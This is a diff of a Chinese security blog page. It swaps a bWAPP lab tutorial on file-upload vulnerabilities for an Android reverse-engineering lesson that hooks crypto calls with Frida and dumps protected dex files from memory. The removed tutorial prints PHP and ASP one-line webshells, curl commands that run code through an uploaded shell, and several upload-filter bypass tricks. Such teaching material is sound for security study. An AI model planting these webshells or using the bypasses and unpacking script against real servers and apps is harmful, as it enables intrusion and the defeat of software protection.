@@ -17,23 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>web安全之文件上传漏洞 | Hexo</title>
-  <meta name="description" content="文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&amp;#x27;hacker&amp;#x27;]); ?&gt;# 这里将post">
+  <title>Android逆向第六课 - frida （下） | Hexo</title>
+  <meta name="description" content="如何分析请求中的token ?  抓包分析，了解头信息的组成 分析头信息，拆解哪些头信息可以直接组装（比如 app-version，device-ID） 分析不能组装的数据的格式。（token：df21awdee0dc9cdf2333211WWWEER ） 反编译APP（先脱壳） 通过关键字 或者 其他手段定位到token加密的地方 分析出是如何加密的。  借助frida，我们可以简化上面的流程">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web安全之文件上传漏洞">
-<meta property="og:url" content="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="Android逆向第六课 - frida （下）">
+<meta property="og:url" content="http://yejuns.github.io/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/index.html">
 <meta property="og:site_name" content="风景这边独好">
-<meta property="og:description" content="文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&amp;#x27;hacker&amp;#x27;]); ?&gt;# 这里将post">
+<meta property="og:description" content="如何分析请求中的token ?  抓包分析，了解头信息的组成 分析头信息，拆解哪些头信息可以直接组装（比如 app-version，device-ID） 分析不能组装的数据的格式。（token：df21awdee0dc9cdf2333211WWWEER ） 反编译APP（先脱壳） 通过关键字 或者 其他手段定位到token加密的地方 分析出是如何加密的。  借助frida，我们可以简化上面的流程">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/yejuns/imgs/main/essay/file-upload-1.png">
-<meta property="article:published_time" content="2020-12-31T08:01:51.000Z">
-<meta property="article:modified_time" content="2021-07-05T00:46:01.692Z">
+<meta property="article:published_time" content="2020-11-11T11:01:51.000Z">
+<meta property="article:modified_time" content="2021-07-31T15:20:29.476Z">
 <meta property="article:author" content="Ye-Jun">
-<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="Android逆向">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/yejuns/imgs/main/essay/file-upload-1.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+  <link rel="canonical" href="http://yejuns.github.io/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/index.html">
   
     <link rel="alternate" href="/atom.xml" title="风景这边独好" type="application/atom+xml">
   
@@ -343,14 +341,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-web安全之文件上传漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-Android逆向第六课" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      web安全之文件上传漏洞
+      Android逆向第六课 - frida （下）
     </h1>
   
 
@@ -358,65 +356,54 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
-	  <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+	<a href="/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/" class="article-date">
+	  <time datetime="2020-11-11T11:01:51.000Z" itemprop="datePublished">2020-11-11</time>
 	</a>
 </span>
         
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
+	<a class="article-tag-link-link" href="/tags/Android%E9%80%86%E5%90%91/" rel="tag">Android逆向</a>
   </span>
 
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h2 id="文件上传漏洞是什么？"><a href="#文件上传漏洞是什么？" class="headerlink" title="文件上传漏洞是什么？"></a>文件上传漏洞是什么？</h2><p>关键字：绕过</p>
-<p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。</p>
-<h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>在bwapp中选择文件上传漏洞的bug模式，</p>
-<p>然后借助<code>eval</code>函数，制做一句话木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 这里将post中上传的hacker字段取出，然后执行这个字段包含的数据</span></span><br></pre></td></tr></table></figure>
-<p>文件上传成功后，我们可以得到这个文件的地址：<br><a target="_blank" rel="noopener" href="http://192.168.50.136/images/shell.php">http://192.168.50.136/images/shell.php</a></p>
-<p>因为我们的漏洞是要通过POST请求中的参数去触发，因此接下来我们通过发起POST请求，就可以拿到我们想要的内容，比如：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、curl -d &quot;hacker=echo get_current_user();&quot; http://192.168.50.136/images/shell.php</span><br><span class="line">2、curl -d &quot;hacker = echo getcwd();&quot; http://192.168.50.136/images/shell.php</span><br></pre></td></tr></table></figure>
-
-<p>PHP中，get_current_user可以获取当前的用户，getcwd()获取当前的目录</p>
-<p>当然，我们拿到了一个shell，就可以使用集成型的工具去做进一步的利用，比如使用<code>中国菜刀</code>、<code>冰蝎</code>。</p>
-<h2 id="常用的一些一句话木马"><a href="#常用的一些一句话木马" class="headerlink" title="常用的一些一句话木马"></a>常用的一些一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(<span class="string">&quot;value&quot;</span>))%&gt;  <span class="comment">#asp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[“value”]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;  <span class="comment">#aspx</span></span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;value&quot;</span>])%&gt; </span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">&quot;value&quot;</span>)%&gt;</span><br><span class="line">&lt;%execute request(<span class="string">&quot;value&quot;</span>)%&gt;</span><br><span class="line">&lt;%execute(request(<span class="string">&quot;value&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="文件上传漏洞的绕过"><a href="#文件上传漏洞的绕过" class="headerlink" title="文件上传漏洞的绕过"></a>文件上传漏洞的绕过</h2><p>上面的例子只是简单的举例，在实际生活中不可能存在这样的漏洞给我们直接去利用，比如会有对.php、js文件的检测，这时候我们就要用各种方法去绕过检测机制</p>
-<p>我们首先将bwapp的漏洞难度改成medium,然后会发现不能再用同样地方式上传文件。</p>
-<p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/file-upload-1.png" alt="上传失败"></p>
-<p>我们只需要将<code>shell.php</code>改名为<code>shell.php3</code>，然后就可以正常上传，<br>和上面一样，我们用相同的一句话木马，也就是说，php3文件是可以被php解释器解析，原因在于，php的解释器配置文件中，有这样一行代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilesMatch <span class="string">&quot;.+\.ph(p[345]?|t|tml)$&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>也就是说，对于php3，php4,php5，phptml等文件，都是可以正常解析的。</p>
-<h2 id="大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如："><a href="#大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：" class="headerlink" title="大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如："></a>大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：</h2><p>Apache 在1.x和2.x版本中存在解析漏洞，因为Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。</p>
-<p>漏洞利用流程：</p>
+        <p>如何分析请求中的token ?</p>
 <ol>
-<li>上传shell.php.test；</li>
-<li>访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。</li>
+<li>抓包分析，了解头信息的组成</li>
+<li>分析头信息，拆解哪些头信息可以直接组装（比如 app-version，device-ID）</li>
+<li>分析不能组装的数据的格式。（token：df21awdee0dc9cdf2333211WWWEER ）</li>
+<li>反编译APP（先脱壳）</li>
+<li>通过关键字 或者 其他手段定位到token加密的地方</li>
+<li>分析出是如何加密的。</li>
 </ol>
-<h3 id="1、前端验证绕过"><a href="#1、前端验证绕过" class="headerlink" title="1、前端验证绕过"></a>1、前端验证绕过</h3><p><code>原因</code>：很多网站、CMS 都有使用，只在前端利用JavaScript 来做校验。</p>
-<p>漏洞利用流程（两种方法都可以）:</p>
+<p>借助frida，我们可以简化上面的流程 （因为无论token如何变化，都是要调用一种加密算法（md5 base64 rsa sha）来对源token进行处理）</p>
 <ol>
-<li>通过Burp Suite抓包，然后修改内容后放行。</li>
-<li>通过Chrome禁止/删除JavaScript代码.</li>
+<li>直接hook常见的加密类，然后在加密的方法里面做打印，得到源 token</li>
+<li>在加密类中打印调用栈，找到加密的方法</li>
 </ol>
-<h3 id="2、-htaccess绕过"><a href="#2、-htaccess绕过" class="headerlink" title="2、.htaccess绕过"></a>2、.htaccess绕过</h3><p>.htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。</p>
-<p>场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的<code>黑名单</code>过滤。</p>
-<h3 id="3、大小写绕过"><a href="#3、大小写绕过" class="headerlink" title="3、大小写绕过"></a>3、大小写绕过</h3><p>如果我们想上传一个php木马，那么我们可以上传一个pHp即可</p>
-<h3 id="4、windows文件流特性绕过"><a href="#4、windows文件流特性绕过" class="headerlink" title="4、windows文件流特性绕过"></a>4、windows文件流特性绕过</h3><p>NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。</p>
-<h3 id="5、-00截断绕过"><a href="#5、-00截断绕过" class="headerlink" title="5、%00截断绕过"></a>5、%00截断绕过</h3><p>即对于白名单的方式，如何绕过？</p>
-<p>可以对上传的文件名中加入十六进制的<code>00</code>，这样就可以将test.php.png截断成test.php。</p>
-<h3 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h3><p>我们可以拼接png与php文件，尝试执行。</p>
-<p>需要注意的是，在拼接png文件时，我们需要将png文件中大部分的信息删除，只保留那些最基本的文件信息，防止出现php无法解析特殊字符的情况。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打印调用堆栈</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printstack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   send(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="frida-脱壳"><a href="#frida-脱壳" class="headerlink" title="frida 脱壳"></a>frida 脱壳</h2><h3 id="脱壳原理"><a href="#脱壳原理" class="headerlink" title="脱壳原理"></a>脱壳原理</h3><p>源dex文件最终会加载进内存，因此只要Hook加载Dex的函数，把Dex从内存中dump出来。而最为关键的方法就是 <code>OpenMemory() </code>方法。</p>
+<ol>
+<li>导出 Android 系统的 /system/lib/libart.so 到本地。然后使用 IDA 查看 <code>OpenMemory</code> 对应的签名函数名（android 9 和 android 7对函数名的命名会不一致）</li>
+<li>获取 dex 文件在内存中的起始位置；</li>
+<li>根据dex文件格式，因为从起始位置开始的第32个字节是该dex文件的大小，所以根据起始位置和大小，就可以 dump 整个 dex 文件</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">package = <span class="string">&quot;com.xtuone.android.syllabus&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">open_memory_9 = <span class="string">&quot;_ZN3art13DexFileLoader10OpenCommonEPKhjS2_jRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPKNS_10OatDexFileEbbPS9_NS3_10unique_ptrINS_16DexFileContainerENS3_14default_deleteISH_EEEEPNS0_12VerifyResultE&quot;</span></span><br><span class="line">open_memory_7 = <span class="string">&quot;_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;</span></span><br><span class="line"></span><br><span class="line">src = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">var openMemory_address = Module.findExportByName(&quot;libart.so&quot;, &quot;_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;);</span></span><br><span class="line"><span class="string">send(&#x27;openMemory address:&#x27;+openMemory_address)</span></span><br><span class="line"><span class="string">Interceptor.attach(openMemory_address, &#123;</span></span><br><span class="line"><span class="string">    onEnter: function (args) &#123;</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">        //dex文件的起始位置</span></span><br><span class="line"><span class="string">        var dex_begin_address = args[1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //dex文件的前8个字节是magic字段 看dex的文件格式说明</span></span><br><span class="line"><span class="string">        //打印magic（会显示 &quot;dex 035&quot;） 三个字符 可以验证是否为dex文件 </span></span><br><span class="line"><span class="string">        console.log(&quot;magic : &quot; + Memory.readUtf8String(dex_begin_address))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //把地址转换成整型 再加32 </span></span><br><span class="line"><span class="string">        //因为dex文件的第32个字节处存放的是 dex文件的大小</span></span><br><span class="line"><span class="string">        var address = parseInt(dex_begin_address, 16) + 0x20</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //把address地址指向的内存值读出来 该值就是dex的文件大小</span></span><br><span class="line"><span class="string">        //ptr(address)转换的原因是 frida只接受 NativePointer类型指针</span></span><br><span class="line"><span class="string">        var dex_size = Memory.readInt(ptr(address))</span></span><br><span class="line"><span class="string">        console.log(&quot;dex_size :&quot; + dex_size)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        //frida写文件 把内存中的数据 写到本地</span></span><br><span class="line"><span class="string">        var timestamp = new Date().getTime();</span></span><br><span class="line"><span class="string">        var file = new File(&quot;/data/data/%s/&quot; + timestamp + &quot;.dex&quot;, &quot;wb&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //Memory.readByteArray(begin, length)</span></span><br><span class="line"><span class="string">        //把内存里的数据读出来，从begin开始读，取length长度</span></span><br><span class="line"><span class="string">        file.write(Memory.readByteArray(dex_begin_address, dex_size))</span></span><br><span class="line"><span class="string">        file.flush()</span></span><br><span class="line"><span class="string">        file.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        send(&quot;dex begin address:&quot;+parseInt(dex_begin_address,16))</span></span><br><span class="line"><span class="string">        send(&quot;dex file size:&quot;+dex_size)</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    onLeave: function (retval) &#123;</span></span><br><span class="line"><span class="string">        if (retval.toInt32() &gt; 0) &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>%(package)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;dex 导出目录为: /data/data/%s&quot;</span>%(package))</span><br><span class="line">device = frida.get_usb_device(-<span class="number">1</span>)</span><br><span class="line">pid = device.spawn(package)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(src)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span> , on_message)</span><br><span class="line">script.load()</span><br><span class="line">device.resume(pid)</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>
+
+<p>参考文献</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://tech.youzan.com/qian-tan-android-dexwen-jian/">https://tech.youzan.com/qian-tan-android-dexwen-jian/</a></p>
+</blockquote>
 
       
     </div>
@@ -426,7 +413,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="web安全之文件上传漏洞" target="_blank" rel="external">http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a>
+      <a href="http://yejuns.github.io/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/" title="Android逆向第六课 - frida （下）" target="_blank" rel="external">http://yejuns.github.io/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -473,12 +460,12 @@
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%94%BB%E5%87%BB/" title="web漏洞"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+      <a href="/2020/11/11/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" title="web安全之php代码注入"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="windows常用命令"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/11/01/AWVS%E4%BD%BF%E7%94%A8/" title="AWVS安装、使用教程"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
